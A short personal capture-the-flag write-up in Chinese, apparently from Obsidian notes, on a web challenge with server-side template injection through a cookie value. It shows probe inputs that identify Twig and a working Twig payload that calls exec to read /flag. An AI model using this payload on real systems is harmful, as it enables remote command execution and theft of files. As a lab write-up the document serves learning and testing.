![[Pasted image 20221120211116.png]]

---
首页长这样
![[Pasted image 20221120211132.png]]

等等，题目不是stable吗，这里咋变成subtle了QwQ
![[Pasted image 20221120211200.png]]

```php
/flag.php
```
![[Pasted image 20221120211327.png]]
输入`username`上传之后是这样
![[Pasted image 20221120211704.png]]
POST的内容是`username=CrackTC&submit=submit`

同时设置`cookie`
![[Pasted image 20221120211901.png]]

点击`Logout`后实际上是`GET /logout.php`

---
尝试从`cookie`值入手，看看是不是`SSTI`之类的
```php
user={{1-2}}
```
![[Pasted image 20221120212926.png]]

芜湖
```twig
user={{phpinfo()}}
```
![[Pasted image 20221120213341.png]]
括号被过滤掉了好像

可恶，之后居然就没思路了呜呜呜

搜了下网上有个decision tree长这样
![[Pasted image 20221120214710.png]]

先不管咋注入，确定模板引擎先
```twig
user={{7*'7'}}
```
![[Pasted image 20221120214943.png]]
这里回显49，说明是`Twig`
```twig
{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("cat /flag")}}
```
![[Pasted image 20221120220302.png]]
这个看字面意思好像是先注册一个回调，当获取一个未定义的过滤器时候调用这个回调，并向它传递试图获取的过滤器名字，所以最终就变成了向`exec`传递`cat /flag`，也就获取到了`flag`（推测之前回显`What do you want to do?!`是我没搞懂语法整出报错了，并不是括号被过滤了QAQ）
#Web #HTTP #twig #SSTI #RCE #PHP #Header 